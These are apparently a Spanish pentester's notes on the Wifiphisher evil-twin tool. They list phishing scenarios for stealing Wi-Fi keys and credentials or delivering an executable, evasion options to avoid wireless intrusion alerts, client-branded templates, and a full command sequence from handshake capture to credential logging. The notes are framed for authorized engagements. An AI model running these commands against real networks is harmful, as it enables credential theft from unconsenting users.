---
tags:
  - Wi-Fi/Evil-Twin
  - Tipo/Arsenal
  - Pentesting/Explotacion
Descripción: "Los escenarios de phishing disponibles, las opciones de sigilo que HTB no menciona y cómo adaptar una plantilla al cliente"
Fecha de actualización: 2026-08-04
Nota previa: "[[00 - Introducción a Wifiphisher]]"
Nota siguiente: 
Area: "[[Wifiphisher.base|Wifiphisher]]"
---
---

# Escenarios

Se eligen con `-p` / `--phishingscenario`:

| Escenario | Qué muestra | Objetivo |
| --------- | ----------- | -------- |
| `firmware-upgrade` | «El router necesita actualizarse; introduce la clave» | **La PSK de la red** |
| `oauth-login` | Portal de acceso con inicio de sesión social | Credenciales de terceros |
| `wifi_connect` | Portal genérico de conexión | Credenciales varias |
| `plugin_update` | Actualización de complemento del navegador | **Entrega de ejecutable** |

<mark style="background: #ADCCFFA6;">`firmware-upgrade` es el más eficaz contra redes PSK</mark> por un motivo de contexto: el usuario acaba de perder la conexión —por la desautenticación— y aparece una página que explica exactamente eso. La causa y el efecto encajan, que es lo que hace creíble el engaño.

`plugin_update` cambia de categoría: en vez de pedir una contraseña, sirve un ejecutable. Eso convierte un ataque de red en un acceso a endpoint y **exige una autorización distinta**, con acuerdo previo sobre la carga y su limpieza.

# Las opciones de sigilo

Estas son las que marcan la diferencia entre un ataque profesional y uno que dispara todas las alarmas. HTB no menciona ninguna:

| Opción | Efecto |
| ------ | ------ |
| `--nodeauth` | **AP falso sin desautenticar**: mucho más sigiloso, y sin DoS |
| `--quitonsuccess` | Termina al capturar. Menos tiempo emitiendo |
| `--deauth-essid` | Limita la desautenticación a un ESSID concreto |
| `--deauth-channels` | Restringe los canales donde desautentica |
| `--disable-karma` | Desactiva la respuesta indiscriminada a *probes* |
| `--no-mac-randomization` | Conserva la MAC (útil si el WIPS ya la conoce) |
| `--mac-ap-interface` | Fija la MAC del AP falso |

> [!important]+ `--nodeauth` casi siempre es la opción correcta
> Con `PMF` activo la desautenticación **no funciona**, así que insistir sólo genera alertas `DEAUTHFLOOD` sin resultado. Y aunque no haya PMF, esperar al *roaming* natural del cliente logra lo mismo sin desconectar a nadie. <mark style="background: #FFB86CA6;">En un hospital o una planta industrial, `--nodeauth` no es sigilo: es evitar un incidente</mark>.

`--deauth-essid` y `--deauth-channels` son el control de alcance de la herramienta: sin ellos, la desautenticación alcanza a dispositivos de redes vecinas que no están en el contrato.

# Adaptar la plantilla al cliente

```shell-session
$ sudo wifiphisher -aI wlan1 -eI wlan2 \
      --phishing-pages-directory /opt/plantillas-cliente \
      -p portal-corporativo --phishing-essid "CorpWiFi"
```

| Opción | Función |
| ------ | ------- |
| `--phishing-pages-directory` | Directorio de plantillas propias |
| `--phishing-essid` | Nombre que muestra el portal (puede diferir del ESSID) |
| `--essid` | ESSID que anuncia el AP falso |
| `--presharedkey` | Levantar el AP falso **con** clave, no abierto |

<mark style="background: #8000E1A6;">Una plantilla genérica con el logotipo del fabricante del router funciona; una con la identidad visual del cliente funciona mucho mejor</mark>. Es trabajo de media hora y suele duplicar la tasa de éxito — el mismo principio que copiar los campos del certificado legítimo en [[01 - Ataques a WPA-Enterprise con EAPHammer]].

`--presharedkey` cubre un caso particular: si la red objetivo es PSK y **ya se conoce la clave**, el AP falso puede replicarla para que los clientes se conecten de forma transparente y quedar como MITM, sin portal ni sospecha.

# Redes conocidas y beacons

| Opción | Función |
| ------ | ------- |
| `--known-beacons` | Emite balizas de una lista de SSID comunes |
| `--force-hostapd` | Usar `hostapd` del sistema en vez del integrado |
| `--dnsmasq-conf` | Configuración propia de `dnsmasq` |

`--known-beacons` es la respuesta a que los clientes modernos ya casi no emiten *probes* dirigidas: en vez de esperar a que pregunten, se anuncian redes muy comunes por si alguna está en su lista de preferidas. Genera bastante ruido — la firma que busca `KARMAOUI`, ver [[02 - Alertas y uso como WIDS]].

# Registro y evidencia

```shell-session
$ sudo wifiphisher -aI wlan1 -eI wlan2 -p firmware-upgrade \
      --logging --logpath /opt/engagement/wifiphisher.log \
      --credential-log-path /opt/engagement/credenciales.log
```

| Opción | Función |
| ------ | ------- |
| `--logging` | Activa el registro |
| `--logpath` | Fichero de registro |
| `--credential-log-path` | Fichero separado para las credenciales |

Separar el registro de las credenciales tiene sentido operativo: <mark style="background: #FF5582A6;">el primero va al informe como evidencia; el segundo contiene secretos del cliente</mark> y se destruye al cierre, con constancia documentada. El procedimiento está en [[11 - Post-explotación y valor para el cliente]].

# Flujo completo

```shell-session
# 1. Handshake previo, para poder validar
$ sudo hcxdumptool -i wlan0 -c 6a --bpf=alcance.bpf --exitoneapol -w cap.pcapng
$ hcxpcapngtool -o hash.hc22000 cap.pcapng

# 2. Preparar el sistema
$ sudo systemctl stop systemd-resolved

# 3. Portal, sin desautenticar y con validación
$ sudo wifiphisher -aI wlan1 -eI wlan2 -p firmware-upgrade \
      --handshake-capture cap-01.cap --nodeauth --quitonsuccess -kN \
      --credential-log-path /opt/engagement/creds.log

# 4. Restaurar
$ sudo systemctl restart NetworkManager systemd-resolved
```

El paso 1 no es opcional: sin handshake con el que contrastar, lo que se recoja en el paso 3 no se puede dar por válido.
